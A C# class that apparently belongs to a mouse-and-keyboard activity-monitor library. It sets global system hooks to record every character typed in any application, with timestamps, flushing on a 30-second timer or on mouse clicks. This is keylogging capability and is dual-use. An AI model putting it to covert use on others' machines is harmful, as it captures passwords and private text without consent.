using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using MouseKeyboardActivityMonitor.WinApi;

namespace MouseKeyboardActivityMonitor.HookUserActivity
{
    public sealed class RecordKeyPress
    {
        private readonly KeyboardHookListener m_KeyboardHookManager;
        private readonly MouseHookListener m_MouseHookManager;
        private System.Timers.Timer savePressKeysTimer;
        private string lastPressedKeyChars = string.Empty;
        private Dictionary<DateTime, string> lstKeyPress = new Dictionary<DateTime, string>();
        private bool validCHar = true;

        /// <summary>
        /// Last pressed keys.
        /// It's Read Only.
        /// </summary>
        public string LastPressedKeyChars { get { return lastPressedKeyChars; } }

        /// <summary>
        /// Read Only List of Pressed Key Chars
        /// </summary>
        public Dictionary<DateTime, string> ListPressedKeys { get { return lstKeyPress; } }

        /// <summary>
        /// Last pressed keys
        /// </summary>
        internal string LastPressedKeys
        {
            get { return lastPressedKeyChars; }
            set
            {
                lastPressedKeyChars = value;
                savePressKeysTimer.Stop();
            }
        }

        public RecordKeyPress()
        {
            savePressKeysTimer = new System.Timers.Timer(30 * 1000); // Occurs every 30 seconds...
            savePressKeysTimer.Elapsed += savePressKeysTimer_Elapsed;

            m_KeyboardHookManager = new KeyboardHookListener(new GlobalHooker());
            m_KeyboardHookManager.Enabled = true;
            m_KeyboardHookManager.KeyPress += m_KeyboardHookManager_KeyPress;
            m_KeyboardHookManager.KeyDown += m_KeyboardHookManager_KeyDown;

            m_MouseHookManager = new MouseHookListener(new GlobalHooker());
            m_MouseHookManager.Enabled = true;
            m_MouseHookManager.MouseDown += m_MouseHookManager_MouseDown;
        }

        public override string ToString()
        {
            String result = string.Empty;

            foreach (var anyKeyPress in lstKeyPress)
                result += String.Format("[{0}]:   '{1}'{2}", anyKeyPress.Key, anyKeyPress.Value, Environment.NewLine);

            return result;
        }

        #region Event Methods
        private void savePressKeysTimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (!System.String.IsNullOrEmpty(LastPressedKeys))
            {
                lstKeyPress.Add(e.SignalTime, LastPressedKeys);

                LastPressedKeys = string.Empty;
            }
        }

        private void m_KeyboardHookManager_KeyDown(object sender, System.Windows.Forms.KeyEventArgs e)
        {
            if (!System.String.IsNullOrEmpty(LastPressedKeys))
            {
                if (e.KeyCode == System.Windows.Forms.Keys.Back)
                {
                    LastPressedKeys = LastPressedKeys.Substring(0, LastPressedKeys.Length - 1);

                    validCHar = false;
                }
            }
            else if (e.Alt || e.Control ||
                     e.KeyCode == Keys.Left || e.KeyCode == Keys.Right ||
                     e.KeyCode == Keys.Up || e.KeyCode == Keys.Down ||
                     e.KeyCode == Keys.End || e.KeyCode == Keys.Escape ||
                     e.KeyCode == Keys.Delete || e.KeyCode == Keys.Home ||
                     e.KeyCode == Keys.Insert || e.KeyCode == Keys.NumLock ||
                     e.KeyCode == Keys.PageDown || e.KeyCode == Keys.PageUp ||
                     e.KeyCode == Keys.PrintScreen || e.KeyCode == Keys.Pause)
            { validCHar = false; }
            else
            { validCHar = true; }
        }

        private void m_KeyboardHookManager_KeyPress(object sender, System.Windows.Forms.KeyPressEventArgs e)
        {
            if (validCHar) LastPressedKeys += e.KeyChar.ToString();
            if (!System.String.IsNullOrEmpty(LastPressedKeys))
            {
                savePressKeysTimer.Start();
            }
        }

        private void m_MouseHookManager_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (e.Button != System.Windows.Forms.MouseButtons.None || e.Clicks > 0)
            {
                if (!System.String.IsNullOrEmpty(LastPressedKeys))
                {
                    lstKeyPress.Add(DateTime.Now, LastPressedKeys);

                    LastPressedKeys = string.Empty;
                }
            }
        }
        #endregion
    }
}
